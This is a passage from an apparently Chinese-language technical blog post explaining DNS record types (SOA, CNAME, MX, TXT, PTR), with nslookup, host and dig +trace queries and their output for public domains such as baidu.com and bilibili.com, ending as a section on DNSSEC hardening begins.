class="hljs-number">2592000</span><br>minimum = <span class="hljs-number">7200</span><br></code></pre></td></tr></table></figure><h5 id="host-t-SOA-domain"><a href="#host-t-SOA-domain" class="headerlink" title="host -t SOA domain"></a>host -t SOA domain</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  ~ host -t NS baidu<span class="hljs-selector-class">.com</span><br>baidu<span class="hljs-selector-class">.com</span> name server ns2<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span> name server ns4<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span> name server ns3<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span> name server ns7<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span> name server dns<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>➜  ~ host -t SOA baidu<span class="hljs-selector-class">.com</span><br>baidu<span class="hljs-selector-class">.com</span> has SOA record dns<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. sa<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. <span class="hljs-number">2012145588</span> <span class="hljs-number">300</span> <span class="hljs-number">300</span> <span class="hljs-number">2592000</span> <span class="hljs-number">7200</span><br></code></pre></td></tr></table></figure><p>比较权威DNS上的SOA记录</p><h5 id="host-C-domain"><a href="#host-C-domain" class="headerlink" title="host -C domain"></a>host -C domain</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  ~ host -C baidu<span class="hljs-selector-class">.com</span><br>Nameserver <span class="hljs-number">220.181</span>.<span class="hljs-number">33.31</span>:<br>baidu<span class="hljs-selector-class">.com</span> has SOA record dns<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. sa<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. <span class="hljs-number">2012145588</span> <span class="hljs-number">300</span> <span class="hljs-number">300</span> <span class="hljs-number">2592000</span> <span class="hljs-number">7200</span><br>Nameserver <span class="hljs-number">240</span>e:<span class="hljs-number">940</span>:<span class="hljs-number">603</span>:<span class="hljs-number">4</span>:<span class="hljs-number">0</span>:ff:b01b:<span class="hljs-number">589</span>a:<br>baidu<span class="hljs-selector-class">.com</span> has SOA record dns<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. sa<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. <span class="hljs-number">2012145588</span> <span class="hljs-number">300</span> <span class="hljs-number">300</span> <span class="hljs-number">2592000</span> <span class="hljs-number">7200</span><br>Nameserver <span class="hljs-number">110.242</span>.<span class="hljs-number">68.134</span>:<br>baidu<span class="hljs-selector-class">.com</span> has SOA record dns<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. sa<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. <span class="hljs-number">2012145588</span> <span class="hljs-number">300</span> <span class="hljs-number">300</span> <span class="hljs-number">2592000</span> <span class="hljs-number">7200</span><br>Nameserver <span class="hljs-number">112.80</span>.<span class="hljs-number">248.64</span>:<br>baidu<span class="hljs-selector-class">.com</span> has SOA record dns<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. sa<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. <span class="hljs-number">2012145588</span> <span class="hljs-number">300</span> <span class="hljs-number">300</span> <span class="hljs-number">2592000</span> <span class="hljs-number">7200</span><br>Nameserver <span class="hljs-number">240</span>e:bf:b801:<span class="hljs-number">1002</span>:<span class="hljs-number">0</span>:ff:b024:<span class="hljs-number">26</span>de:<br>baidu<span class="hljs-selector-class">.com</span> has SOA record dns<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. sa<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. <span class="hljs-number">2012145588</span> <span class="hljs-number">300</span> <span class="hljs-number">300</span> <span class="hljs-number">2592000</span> <span class="hljs-number">7200</span><br>Nameserver <span class="hljs-number">180.76</span>.<span class="hljs-number">76.92</span>:<br>baidu<span class="hljs-selector-class">.com</span> has SOA record dns<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. sa<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. <span class="hljs-number">2012145588</span> <span class="hljs-number">300</span> <span class="hljs-number">300</span> <span class="hljs-number">2592000</span> <span class="hljs-number">7200</span><br>Nameserver <span class="hljs-number">14.215</span>.<span class="hljs-number">178.80</span>:<br>baidu<span class="hljs-selector-class">.com</span> has SOA record dns<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. sa<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>. <span class="hljs-number">2012145588</span> <span class="hljs-number">300</span> <span class="hljs-number">300</span> <span class="hljs-number">2592000</span> <span class="hljs-number">7200</span><br></code></pre></td></tr></table></figure><h2 id="CNAME记录"><a href="#CNAME记录" class="headerlink" title="CNAME记录"></a>CNAME记录</h2><h3 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h3><p>规范名称记录，将一个别名关联到另一个域名</p><h3 id="操作-4"><a href="#操作-4" class="headerlink" title="操作"></a>操作</h3><h4 id="查询-4"><a href="#查询-4" class="headerlink" title="查询"></a>查询</h4><h5 id="nslookup-type-CNAME-domain"><a href="#nslookup-type-CNAME-domain" class="headerlink" title="nslookup -type&#x3D;CNAME domain"></a>nslookup -type&#x3D;CNAME domain</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  ~ nslookup -type=cname www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span><br>Server:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1801</span>:<span class="hljs-number">5</span>eba:<span class="hljs-number">9</span>c9e:<span class="hljs-number">5813</span>:ea08:<span class="hljs-number">23</span>f9<br>Address:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1801</span>:<span class="hljs-number">5</span>eba:<span class="hljs-number">9</span>c9e:<span class="hljs-number">5813</span>:ea08:<span class="hljs-number">23</span>f9#<span class="hljs-number">53</span><br><br>Non-authoritative answer:<br>www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>canonical name = www<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.shifen</span><span class="hljs-selector-class">.com</span>.<br><br>Authoritative answers can be found from:<br></code></pre></td></tr></table></figure><h5 id="host-t-CNAME-domain"><a href="#host-t-CNAME-domain" class="headerlink" title="host -t CNAME domain"></a>host -t CNAME domain</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  ~ host -t cname www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span><br>www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span> is an alias <span class="hljs-keyword">for</span> www<span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.shifen</span><span class="hljs-selector-class">.com</span>.<br></code></pre></td></tr></table></figure><h2 id="MX记录"><a href="#MX记录" class="headerlink" title="MX记录"></a>MX记录</h2><h3 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h3><p>邮件交换记录，用于指定邮件服务器</p><h3 id="操作-5"><a href="#操作-5" class="headerlink" title="操作"></a>操作</h3><h4 id="查询-5"><a href="#查询-5" class="headerlink" title="查询"></a>查询</h4><h5 id="nslookup-type-MX-domain"><a href="#nslookup-type-MX-domain" class="headerlink" title="nslookup -type&#x3D;MX domain"></a>nslookup -type&#x3D;MX domain</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➜  ~ nslookup -type=MX baidu<span class="hljs-selector-class">.com</span><br>Server:<span class="hljs-number">240</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1890</span>:<span class="hljs-number">930</span>d:dd4d:ca4d:dc8a:cc02<br>Address:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1890</span>:<span class="hljs-number">930</span>d:dd4d:ca4d:dc8a:cc02#<span class="hljs-number">53</span><br><br>Non-authoritative answer:<br>baidu<span class="hljs-selector-class">.com</span>mail exchanger = <span class="hljs-number">15</span> mx<span class="hljs-selector-class">.n</span><span class="hljs-selector-class">.shifen</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span>mail exchanger = <span class="hljs-number">20</span> mx1<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span>mail exchanger = <span class="hljs-number">20</span> usmx01<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span>mail exchanger = <span class="hljs-number">20</span> jpmx<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span>mail exchanger = <span class="hljs-number">10</span> mx<span class="hljs-selector-class">.maillb</span><span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br>baidu<span class="hljs-selector-class">.com</span>mail exchanger = <span class="hljs-number">20</span> mx50<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span>.<br><br>Authoritative answers can be found from:<br><br>➜  ~ nslookup mx<span class="hljs-selector-class">.n</span><span class="hljs-selector-class">.shifen</span><span class="hljs-selector-class">.com</span><br>Server:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1890</span>:<span class="hljs-number">930</span>d:dd4d:ca4d:dc8a:cc02<br>Address:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1890</span>:<span class="hljs-number">930</span>d:dd4d:ca4d:dc8a:cc02#<span class="hljs-number">53</span><br><br>Non-authoritative answer:<br>Name:mx<span class="hljs-selector-class">.n</span><span class="hljs-selector-class">.shifen</span><span class="hljs-selector-class">.com</span><br>Address: <span class="hljs-number">111.202</span>.<span class="hljs-number">115.85</span><br>Name:mx<span class="hljs-selector-class">.n</span><span class="hljs-selector-class">.shifen</span><span class="hljs-selector-class">.com</span><br>Address: <span class="hljs-number">111.206</span>.<span class="hljs-number">215.185</span><br></code></pre></td></tr></table></figure><h5 id="host-t-mx-domain"><a href="#host-t-mx-domain" class="headerlink" title="host -t mx domain"></a>host -t mx domain</h5><h4 id="设置-1"><a href="#设置-1" class="headerlink" title="设置"></a>设置</h4><p>MX记录值必须为域名格式</p><p>设置MX记录值之前必须创建MX记录值的A记录</p><h2 id="TXT记录"><a href="#TXT记录" class="headerlink" title="TXT记录"></a>TXT记录</h2><h3 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h3><p>文本形式的DNS记录</p><p>常见的TXT记录有 SPF 、DKIM、DMAIC</p><h3 id="操作-6"><a href="#操作-6" class="headerlink" title="操作"></a>操作</h3><h4 id="查询-6"><a href="#查询-6" class="headerlink" title="查询"></a>查询</h4><h5 id="nslookup-type-txt-domain"><a href="#nslookup-type-txt-domain" class="headerlink" title="nslookup -type&#x3D;txt domain"></a>nslookup -type&#x3D;txt domain</h5><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vim">➜  ~ nslookup -<span class="hljs-built_in">type</span>=txt baidu.<span class="hljs-keyword">com</span><br>Server:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1801</span>:<span class="hljs-number">5</span>eb<span class="hljs-variable">a:9c9e</span>:<span class="hljs-number">5813</span>:ea08:<span class="hljs-number">23</span>f9<br>Address:<span class="hljs-number">2408</span>:<span class="hljs-number">8409</span>:<span class="hljs-number">1801</span>:<span class="hljs-number">5</span>eb<span class="hljs-variable">a:9c9e</span>:<span class="hljs-number">5813</span>:ea08:<span class="hljs-number">23</span>f9#<span class="hljs-number">53</span><br><br>Non-authoritative answer:<br>baidu.<span class="hljs-keyword">com</span>text = <span class="hljs-string">&quot;google-site-verification=GHb98-6msqyx_qqjGl5eRatD3QTHyVB6-xQ3gJB5UwM&quot;</span><br>baidu.<span class="hljs-keyword">com</span>text = <span class="hljs-string">&quot;v=spf1 include:spf1.baidu.com include:spf2.baidu.com include:spf3.baidu.com include:spf4.baidu.com a mx ptr -all&quot;</span><br>baidu.<span class="hljs-keyword">com</span>text = <span class="hljs-string">&quot;_globalsign-domain-verification=qjb28W2jJSrWj04NHpB0CvgK9tle5JkOq-EcyWBgnE&quot;</span><br><br>Authoritative answers can <span class="hljs-keyword">be</span> found from:<br><br></code></pre></td></tr></table></figure><h5 id="host-t-txt-domain"><a href="#host-t-txt-domain" class="headerlink" title="host -t txt domain"></a>host -t txt domain</h5><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs excel">➜  ~ host -<span class="hljs-built_in">t</span> txt baidu.com<br>baidu.com descriptive <span class="hljs-built_in">text</span> <span class="hljs-string">&quot;v=spf1 include:spf1.baidu.com include:spf2.baidu.com include:spf3.baidu.com include:spf4.baidu.com a mx ptr -all&quot;</span><br>baidu.com descriptive <span class="hljs-built_in">text</span> <span class="hljs-string">&quot;_globalsign-domain-verification=qjb28W2jJSrWj04NHpB0CvgK9tle5JkOq-EcyWBgnE&quot;</span><br>baidu.com descriptive <span class="hljs-built_in">text</span> <span class="hljs-string">&quot;google-site-verification=GHb98-6msqyx_qqjGl5eRatD3QTHyVB6-xQ3gJB5UwM&quot;</span><br></code></pre></td></tr></table></figure><h4 id="设置-2"><a href="#设置-2" class="headerlink" title="设置"></a>设置</h4><h2 id="PTR记录"><a href="#PTR记录" class="headerlink" title="PTR记录"></a>PTR记录</h2><h3 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h3><p>DNS指针记录,A记录的逆向</p><p>[域名系统 (DNS) ]将[域名]与 [IP 地址]相关联。DNS 指针记录（简称 PTR）提供与 IP 地址关联的域名。DNS PTR 记录与[“A”记录]完全相反，它提供与域名关联的 IP 地址。</p><p>DNS PTR 记录用于[反向 DNS 查找]。当用户尝试在其浏览器中访问域名时，会进行 DNS 查找，将域名与 IP 地址相匹配。反向 DNS 查找与此过程相反：它是以 IP 地址开始并查找域名的查询。</p><h3 id="操作-7"><a href="#操作-7" class="headerlink" title="操作"></a>操作</h3><h4 id="查询-7"><a href="#查询-7" class="headerlink" title="查询"></a>查询</h4><h5 id="nslookup-ip"><a href="#nslookup-ip" class="headerlink" title="nslookup ip"></a>nslookup ip</h5><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">root@iZbp1191gh7vw52537lyxrZ:~# nslookup <span class="hljs-number">111</span>.<span class="hljs-number">202</span>.<span class="hljs-number">115</span>.<span class="hljs-number">85</span><br><span class="hljs-number">85.115.202.111</span>.in-addr.arpaname = mx20.baidu.com.<br><br>Authoritative answers can be found from:<br></code></pre></td></tr></table></figure><h5 id="host-ip"><a href="#host-ip" class="headerlink" title="host ip"></a>host ip</h5><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">root@iZbp1191gh7vw52537lyxrZ:~# host <span class="hljs-number">111</span>.<span class="hljs-number">202</span>.<span class="hljs-number">115</span>.<span class="hljs-number">85</span><br><span class="hljs-number">85.115.202.111</span>.in-addr.arpa domain name pointer mx20.baidu.com.<br></code></pre></td></tr></table></figure><h2 id="SRV记录"><a href="#SRV记录" class="headerlink" title="SRV记录"></a>SRV记录</h2><h1 id="常见通用操作"><a href="#常见通用操作" class="headerlink" title="常见通用操作"></a>常见通用操作</h1><h2 id="dig-trace-查询"><a href="#dig-trace-查询" class="headerlink" title="dig trace 查询"></a>dig trace 查询</h2><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><p><strong>dig +trace domain</strong></p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>1、直接从根域名服务器开始查询</p><p>2、本机代替递归服务器（本地DNS服务器）完成迭代查询</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>1、本地设备向根域名服务器（.） 查询 bilibili.com</p><p><img src="/2024/02/06/network/dns/dns_record_operation/image-20240313174606319.png" alt="image-20240313174606319"></p><p>2、根域名服务器识别为.com顶级域，告知需要去顶级域名服务器（.com)查询，并将顶级域名服务器返回给本地设备</p><p><img src="/2024/02/06/network/dns/dns_record_operation/image-20240313174710207.png" alt="image-20240313174710207"></p><p>3、本地设备又向顶级域名服务器请求查询bilibili.com</p><p><img src="/2024/02/06/network/dns/dns_record_operation/image-20240313174741534.png" alt="image-20240313174741534"></p><p>4、.com顶级域名服务器没有bilibili.com记录，告知需要去查询的域名服务器</p><p><img src="/2024/02/06/network/dns/dns_record_operation/image-20240313174806843.png" alt="image-20240313174806843"></p><p>5、本地设备再次向上一步请求返回的域名服务器发起请求</p><p><img src="/2024/02/06/network/dns/dns_record_operation/image-20240313174826942.png" alt="image-20240313174826942"></p><p>6、返回查询结果</p><p><img src="/2024/02/06/network/dns/dns_record_operation/image-20240313174852834.png" alt="image-20240313174852834"></p><figure class="highlight mercury"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs mercury">root@iZbp1191gh7vw52537lyxrZ:~# dig +<span class="hljs-keyword">trace</span> bilibili.com<br><br>; &lt;&lt;&gt;&gt; DiG <span class="hljs-number">9.18</span>.<span class="hljs-number">18</span>-<span class="hljs-number">0</span>ubuntu0.<span class="hljs-number">22.04</span>.<span class="hljs-number">2</span>-Ubuntu &lt;&lt;&gt;&gt; +<span class="hljs-keyword">trace</span> bilibili.com<br>;; global options: +cmd<br>.<span class="hljs-number">9</span>INNSf.root-servers.net.<br>.<span class="hljs-number">9</span>INNSd.root-servers.net.<br>.<span class="hljs-number">9</span>INNSg.root-servers.net.<br>.<span class="hljs-number">9</span>INNSh.root-servers.net.<br>.<span class="hljs-number">9</span>INNSa.root-servers.net.<br>.<span class="hljs-number">9</span>INNSc.root-servers.net.<br>.<span class="hljs-number">9</span>INNSk.root-servers.net.<br>.<span class="hljs-number">9</span>INNSb.root-servers.net.<br>.<span class="hljs-number">9</span>INNSl.root-servers.net.<br>.<span class="hljs-number">9</span>INNSm.root-servers.net.<br>.<span class="hljs-number">9</span>INNSj.root-servers.net.<br>.<span class="hljs-number">9</span>INNSi.root-servers.net.<br>.<span class="hljs-number">9</span>INNSe.root-servers.net.<br>;; Received <span class="hljs-number">239</span> bytes from <span class="hljs-number">127.0</span>.<span class="hljs-number">0.53</span>#<span class="hljs-number">53</span>(<span class="hljs-number">127.0</span>.<span class="hljs-number">0.53</span>) in <span class="hljs-number">0</span> ms<br><br>;; UDP setup with <span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b#<span class="hljs-number">53</span>(<span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b) for bilibili.com failed: network unreachable.<br>;; UDP setup with <span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b#<span class="hljs-number">53</span>(<span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b) for bilibili.com failed: network unreachable.<br>;; UDP setup with <span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b#<span class="hljs-number">53</span>(<span class="hljs-number">2801</span>:<span class="hljs-number">1</span>b8:<span class="hljs-number">10</span>::b) for bilibili.com failed: network unreachable.<br>;; UDP setup with <span class="hljs-number">2001</span>:<span class="hljs-number">7</span>fe::<span class="hljs-number">53</span>#<span class="hljs-number">53</span>(<span class="hljs-number">2001</span>:<span class="hljs-number">7</span>fe::<span class="hljs-number">53</span>) for bilibili.com failed: network unreachable.<br>com.<span class="hljs-number">172800</span>INNSa.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSb.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSc.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSd.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSe.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSf.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSg.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSh.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSi.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSj.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSk.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSl.gtld-servers.net.<br>com.<span class="hljs-number">172800</span>INNSm.gtld-servers.net.<br>com.<span class="hljs-number">86400</span>INDS<span class="hljs-number">19718</span> <span class="hljs-number">13</span> <span class="hljs-number">2</span> <span class="hljs-number">8</span>ACBB0CD28F41250A80A491389424D341522D946B0DA0C0291F2D3D7 <span class="hljs-number">71</span>D7805A<br>com.<span class="hljs-number">86400</span>INRRSIGDS <span class="hljs-number">8</span> <span class="hljs-number">1</span> <span class="hljs-number">86400</span> <span class="hljs-number">20240326050000</span> <span class="hljs-number">20240313040000</span> <span class="hljs-number">30903</span> . HMM7P1NYHa5RzV8Iqk5Kko4+/<span class="hljs-number">86</span>zW+tj+amxZiFP6qFZibjGiZ0XW4Nw gToWas+AVxHF+a73XU/<span class="hljs-number">0</span>mSdL6N0xpyabRsyYYXAYaZ4lZ9W1nST5DclJ hpyGcN6bP8+fm1VKLM5wXYuZ6tyeQuvDA3g8RfsN8B5q1CT31dU6vlyL <span class="hljs-number">8</span>NfbTTSDzYnH4zZzLpojJZ5dmW6Ua3oNiFitK4Ri+<span class="hljs-number">2</span>aOtv81WBLRqNHI WjRRbiP5JBAZDAj+iV+vQATwmH2gDxXBe6WN1KTbzcV7Nc9ds0l+B1Oy SF4zKaRP3wu3P0IyMzwDT63W76yCsesmW1+SIJpweI2HLA9MBx/+DZmZ iz7i6Q<span class="hljs-built_in">=</span><span class="hljs-built_in">=</span><br>;; Received <span class="hljs-number">1172</span> bytes from <span class="hljs-number">198.97</span>.<span class="hljs-number">190.53</span>#<span class="hljs-number">53</span>(h.root-servers.net) in <span class="hljs-number">104</span> ms<br><br>;; UDP setup with <span class="hljs-number">2001</span>:<span class="hljs-number">503</span>:<span class="hljs-number">39</span>c1::<span class="hljs-number">30</span>#<span class="hljs-number">53</span>(<span class="hljs-number">2001</span>:<span class="hljs-number">503</span>:<span class="hljs-number">39</span>c1::<span class="hljs-number">30</span>) for bilibili.com failed: network unreachable.<br>;; UDP setup with <span class="hljs-number">2001</span>:<span class="hljs-number">503</span>:d2d::<span class="hljs-number">30</span>#<span class="hljs-number">53</span>(<span class="hljs-number">2001</span>:<span class="hljs-number">503</span>:d2d::<span class="hljs-number">30</span>) for bilibili.com failed: network unreachable.<br>bilibili.com.<span class="hljs-number">172800</span>INNSns3.dnsv5.com.<br>bilibili.com.<span class="hljs-number">172800</span>INNSns4.dnsv5.com.<br>CK0POJMG874LJREF7EFN8430QVIT8BSM.com. <span class="hljs-number">86400</span> IN NSEC3 <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> - CK0Q2D6NI4I7EQH8NA30NS61O48UL8G5 NS SOA RRSIG DNSKEY NSEC3PARAM<br>CK0POJMG874LJREF7EFN8430QVIT8BSM.com. <span class="hljs-number">86400</span> IN RRSIG NSEC3 <span class="hljs-number">13</span> <span class="hljs-number">2</span> <span class="hljs-number">86400</span> <span class="hljs-number">20240317052456</span> <span class="hljs-number">20240310041456</span> <span class="hljs-number">4534</span> com. nDsu/HWipq9WrDO772lGr5Rm0BGksazMNQ4BCktOTsLTqadXRbTc8Tx8 W1gAunMnPlgJUg7EzY+Bu0NR3W4cig<span class="hljs-built_in">=</span><span class="hljs-built_in">=</span><br><span class="hljs-number">34</span>N8HDRIDRS931JVPDDJA5QLVPMOGVUB.com. <span class="hljs-number">86400</span> IN NSEC3 <span class="hljs-number">1</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span> - <span class="hljs-number">34</span>N8VR2QIA8E6FQT7AUGCM6FARONEELO NS DS RRSIG<br><span class="hljs-number">34</span>N8HDRIDRS931JVPDDJA5QLVPMOGVUB.com. <span class="hljs-number">86400</span> IN RRSIG NSEC3 <span class="hljs-number">13</span> <span class="hljs-number">2</span> <span class="hljs-number">86400</span> <span class="hljs-number">20240319051354</span> <span class="hljs-number">20240312040354</span> <span class="hljs-number">4534</span> com. C1pama7SsZ1nj2soxDM0wG3vGlXjMB1Mn20jEnBOAVmXFgoPN+bQpoXs UemGxrKrQe83kf10kN/<span class="hljs-number">52</span>ul4JYgIrQ<span class="hljs-built_in">=</span><span class="hljs-built_in">=</span><br>;; Received <span class="hljs-number">784</span> bytes from <span class="hljs-number">192.52</span>.<span class="hljs-number">178.30</span>#<span class="hljs-number">53</span>(k.gtld-servers.net) in <span class="hljs-number">164</span> ms<br><br>bilibili.com.<span class="hljs-number">60</span>INA<span class="hljs-number">8.134</span>.<span class="hljs-number">50.24</span><br>bilibili.com.<span class="hljs-number">60</span>INA<span class="hljs-number">47.103</span>.<span class="hljs-number">24.173</span><br>bilibili.com.<span class="hljs-number">60</span>INA<span class="hljs-number">119.3</span>.<span class="hljs-number">70.188</span><br>bilibili.com.<span class="hljs-number">60</span>INA<span class="hljs-number">139.159</span>.<span class="hljs-number">241.37</span><br>bilibili.com.<span class="hljs-number">86400</span>INNSns3.dnsv5.com.<br>bilibili.com.<span class="hljs-number">86400</span>INNSns4.dnsv5.com.<br>;; Received <span class="hljs-number">159</span> bytes from <span class="hljs-number">1.12</span>.<span class="hljs-number">0.16</span>#<span class="hljs-number">53</span>(ns4.dnsv5.com) in <span class="hljs-number">16</span> ms<br></code></pre></td></tr></table></figure><h2 id="清空DNS缓存"><a href="#清空DNS缓存" class="headerlink" title="清空DNS缓存"></a>清空DNS缓存</h2><h3 id="Mac电脑"><a href="#Mac电脑" class="headerlink" title="Mac电脑"></a>Mac电脑</h3><p><strong>sudo killall -HUP mDNSResponder</strong></p><h1 id="DNS安全加固"><a href="#DNS安全加固" class="headerlink" title="DNS安全加固"></a>DNS安全加固</h1><h2 id="DNSSEC"><a href="#DNSSEC" class="headerlink" title="DNSSEC"></a>DNSSEC</h2><p>域名系统安全扩展DNS security 